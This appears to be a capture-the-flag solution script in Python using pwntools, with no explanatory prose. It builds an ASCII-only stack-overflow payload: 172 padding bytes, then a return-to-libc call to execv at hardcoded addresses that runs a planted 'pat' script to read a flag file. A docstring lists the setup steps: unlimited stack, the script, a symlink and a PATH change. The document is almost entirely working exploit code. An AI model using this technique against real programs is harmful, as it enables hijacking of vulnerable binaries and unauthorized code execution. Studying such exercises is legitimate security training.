#!/usr/bin/env python

'''
Before Exploit

ulimit -s unlimited
printf '#!/bin/sh\ncat ~/flag\n' > cat.sh
chmod +x cat.sh
ln -s (current directory)/cat.sh pat
export PATH=$PATH:(current directory)
'''

from pwn import *

def is_ascii(c):
	return 31 < ord(c) <= 127

payload = 'a'*172 + p32(0x55643630) # execv
payload += 'ABCD' + p32(0x55575d6c) + p32(0x55575d70) # execv("pat", NULL)

for c in payload:
	if not is_ascii(c):
		print "payload contains non-ascii character 0x%x" % ord(c)
		exit(0)

write('payload', payload)
